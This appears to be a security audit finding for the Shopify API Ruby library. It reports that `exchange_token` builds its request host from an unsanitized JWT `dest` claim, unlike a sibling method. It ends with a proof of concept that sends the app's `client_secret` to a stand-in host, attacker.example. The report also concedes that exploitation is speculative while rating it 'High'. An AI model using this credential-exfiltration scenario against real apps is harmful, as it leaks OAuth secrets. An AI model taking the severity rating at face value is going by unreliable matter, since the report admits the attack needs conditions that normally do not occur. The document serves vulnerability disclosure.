### Title
`TokenExchange.exchange_token` builds the OAuth token-exchange request host from an unsanitized JWT `dest` claim, leaking `client_secret` to an attacker-influenced host - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`exchange_token` takes the `dest` claim out of a session token and uses it verbatim as the `shop` for the `Session` that is passed to `Clients::HttpClient`, which derives the request host directly from `session.shop`. Unlike `migrate_to_expiring_token` in the same module, which runs the shop value through `Utils::ShopValidator.sanitize!` (restricting it to `TRUSTED_SHOPIFY_DOMAINS`), `exchange_token` performs no such validation on `dest_shop` before it is used to build the URL that receives the app's `client_id`/`client_secret`.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` from the raw `dest` claim value with no domain allow‑listing: [1](#0-0) 

`JwtPayload#initialize` only checks the `aud` claim against `Context.api_key`; it does not validate that `dest` is a trusted `*.myshopify.com` (or other `TRUSTED_SHOPIFY_DOMAINS`) host: [2](#0-1) 

`exchange_token` takes this unvalidated `dest_shop` and builds the `Session`/`HttpClient` used to POST the app's `client_secret`: [3](#0-2) 

Compare this with `migrate_to_expiring_token`, in the very same file, which correctly sanitizes the shop value before doing the identical kind of request: [4](#0-3) 

This is the same "mismatched-pair" bug class as the reported `TempleGoldStaking` finding: two code paths that should enforce the same invariant (the destination host must be a trusted Shopify domain) diverge — one path checks it (`migrate_to_expiring_token`), the other doesn't (`exchange_token`). The identity binding broken is: `host that ShopValidator has approved == host that receives the app's client_secret`. In `exchange_token` this equality is never enforced — the "verified" side (JWT signature validity) only proves the token was signed by the app's secret key over *some* `dest` string; it does not prove `dest` is restricted to `myshopify.com`/`myshopify.io`/etc. The HS256 signature check in `JWT.decode` protects payload integrity, not the semantic constraint that `dest` must be a Shopify host — that constraint is supposed to be enforced by `ShopValidator`, and it is skipped here.

### Impact Explanation
If a session token with an attacker-chosen `dest` value can reach `exchange_token` (e.g., a token minted by a party that at some point had a valid signature, or in host applications that pass through externally-supplied/replayed tokens, or future/alternate token issuance paths that don't guarantee `dest` is restricted), `client_id`/`client_secret` would be POSTed to `https://{attacker-controlled-dest}/admin/oauth/access_token`, exfiltrating the app's `client_secret` to a non-Shopify host — this is SSRF carrying the app's own OAuth credentials, matching the "High — SSRF with the app's credentials" impact class in the rules.

### Likelihood Explanation
Exploitability strictly depends on whether `dest` can ever contain a non-Shopify host while still passing the HS256 signature check with the app's own secret — normally Shopify itself issues session tokens, constraining `dest`. The library, however, does not defend in depth here, contrary to its own sibling method (`migrate_to_expiring_token`) which does call `ShopValidator.sanitize!`. This omission is a defense-in-depth/allow-list gap consistent with the reported bug class (an invariant enforced in one code path but silently dropped in a parallel one), even though full exploitability requires a scenario where JWT integrity alone is insufficient to guarantee `dest` is a trusted Shopify domain.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, call `Utils::ShopValidator.sanitize!(dest_shop)` (as already done in `migrate_to_expiring_token`) before constructing `shop_session`/`HttpClient`, ensuring the host that receives `client_secret` is always restricted to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Obtain/construct a session token whose `dest` claim is `https://attacker.example` (or a domain not in `TRUSTED_SHOPIFY_DOMAINS`) but which otherwise passes `JWT.decode` verification against the app's `api_secret_key`/`aud`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload#shop` returns `"attacker.example"` unfiltered.
4. `Clients::HttpClient.new(session: Session.new(shop: "attacker.example"), ...)` sends a POST containing `client_id`/`client_secret` to `https://attacker.example/admin/oauth/access_token`, disclosing the app's credentials to the attacker's host — no such check exists here, whereas the identical `migrate_to_expiring_token` path guards against it via `Utils::ShopValidator.sanitize!`.
